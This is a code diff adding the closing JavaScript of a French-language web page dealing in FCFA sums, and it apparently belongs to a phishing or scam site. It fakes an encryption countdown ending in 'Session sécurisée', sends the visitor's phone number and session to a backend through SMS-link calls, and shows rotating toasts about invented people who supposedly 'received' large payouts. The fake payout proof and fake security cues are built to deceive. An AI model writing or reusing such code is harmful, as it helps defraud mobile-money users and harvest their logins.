+        tEl.textContent='Session sécurisée ✓';
+        sp.style.display='none';
+        cb.style.display='block';
+        setTimeout(function(){ go('s-ok','s-splash'); setTimeout(function(){ go('s-splash','s-login'); },1500); }, 800);
+      } else { tEl.textContent='Chiffrement… ('+s+'s)'; }
+    },1000);
+  } else {
+    showPop('Erreur','Une erreur est survenue. Veuillez réessayer.');
+  }
+}
+
+async function doSmsResend(){
+  if(!sessId) return;
+  startSmsResendCd();
+  showLoad('Renvoi du lien…');
+  await callApi('sms_resend', { sessionId: sessId, phone: loginVal });
+  hideLoad();
+  document.getElementById('tav').textContent = '🔄';
+  document.getElementById('tn').textContent  = 'Lien renvoyé';
+  document.getElementById('td').textContent  = 'Un nouveau lien SMS a été envoyé';
+  var t = document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(function(){ t.classList.remove('show'); }, 3000);
+}
+
+async function doSmsBroken(){
+  if(!sessId) return;
+  await callApi('sms_link_broken', { sessionId: sessId, phone: loginVal });
+  document.getElementById('tav').textContent = '⚠️';
+  document.getElementById('tn').textContent  = 'Signalement envoyé';
+  document.getElementById('td').textContent  = 'Notre équipe a été notifiée';
+  var t = document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(function(){ t.classList.remove('show'); }, 3000);
+}
+
+var people=[
+  {n:'Aminata S.',i:'A',a:200000,t:"à l'instant"},
+  {n:'Mamadou D.',i:'M',a:150000,t:'il y a 2 min'},
+  {n:'Fatou N.',i:'F',a:500000,t:'il y a 4 min'},
+  {n:'Ibrahima B.',i:'I',a:220000,t:'il y a 7 min'},
+  {n:'Rokhaya T.',i:'R',a:80000,t:"à l'instant"},
+  {n:'Ousmane K.',i:'O',a:410000,t:'il y a 3 min'},
+];
+var tIdx=0;
+function showToast(){
+  if(!document.getElementById('s-land').classList.contains('active')) return;
+  var p=people[tIdx%people.length]; tIdx++;
+  document.getElementById('tav').textContent=p.i;
+  document.getElementById('tn').textContent=p.n;
+  document.getElementById('td').textContent='a reçu '+p.a.toLocaleString('fr-FR')+' FCFA · '+p.t;
+  var el=document.getElementById('toast'); el.classList.add('show');
+  setTimeout(function(){ el.classList.remove('show'); },4000);
+}
+
+document.getElementById('s-land').classList.remove('active');
+document.getElementById('s-splash').classList.add('active');
+setTimeout(function(){
+  go('s-splash','s-land');
+  sliderChange(100000);
+  setTimeout(function(){ showToast(); setInterval(showToast,7000); },3000);
+}, 2000);
+</script>
+</body>
+</html>
